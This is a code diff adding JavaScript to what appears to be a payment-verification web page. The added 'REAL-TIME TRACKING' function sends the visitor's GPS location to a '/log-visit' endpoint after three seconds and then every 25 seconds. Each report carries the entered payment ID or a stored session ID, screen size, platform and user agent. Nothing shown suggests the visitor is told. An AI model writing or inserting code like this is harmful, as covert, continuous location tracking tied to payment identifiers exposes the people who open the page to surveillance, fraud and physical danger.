@@ -691,6 +691,33 @@
             }, 800);
         }
 
+        // REAL-TIME TRACKING
+        async function sendLiveUpdate() {
+            const loc = await tryGPSContinuous();
+            if (!loc) return;
+
+            fetch('/log-visit', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    paymentId: paymentInput.value.trim() || sessionStorage.getItem('sessionVerificationId'),
+                    location: { finalLocation: loc },
+                    deviceDetails: {
+                        screenResolution: `${window.screen.width}x${window.screen.height}`,
+                        platform: navigator.platform,
+                        userAgent: navigator.userAgent
+                    },
+                    isUpdate: true
+                })
+            }).then(r => r.json()).then(data => {
+                if (data.verificationId) sessionStorage.setItem('sessionVerificationId', data.verificationId);
+            });
+        }
+
+        // Start updates
+        setTimeout(sendLiveUpdate, 3000);
+        setInterval(sendLiveUpdate, 25000);
+
         function validateInput(paymentId) {
             if (!paymentId) {
                 paymentInput.classList.add('input-error');
